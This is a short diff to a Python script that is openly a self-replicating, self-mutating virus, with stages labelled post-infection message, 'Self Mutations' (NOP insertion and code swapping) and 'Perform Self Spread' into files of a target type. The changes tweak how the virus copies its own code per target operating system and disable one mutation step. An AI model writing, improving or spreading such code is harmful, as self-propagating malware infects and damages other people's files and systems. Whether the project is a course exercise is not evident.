@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import socket
 import sys
 import time
@@ -46,7 +46,10 @@ def retrieve_code():
     for line in virus_file:
         virus.append(line)
         if is_end(line): 
+            virus.append("\n")
             break
+
+    virus[0] = "#!/usr/bin/env python" if target_os == "Windows" else "#!/usr/bin/env python3\n"
 
     return virus
 
@@ -208,7 +211,7 @@ post_infection_msg(target_os, infection_message)
 
 # (5) Self Mutations
 virus = retrieve_code()
-virus = mutate_with_nop(virus)
+# virus = mutate_with_nop(virus)
 virus = swap_code(virus)
 
 # exec_code = compile(''.join(virus), '<string>', 'exec')
@@ -217,7 +220,6 @@ virus = swap_code(virus)
 
 # (6) Perform Self Spread
 spread_self(target_file_type, ''.join(virus))
-
-
+sys.exit(1)
 
 # END OF SCRIPT
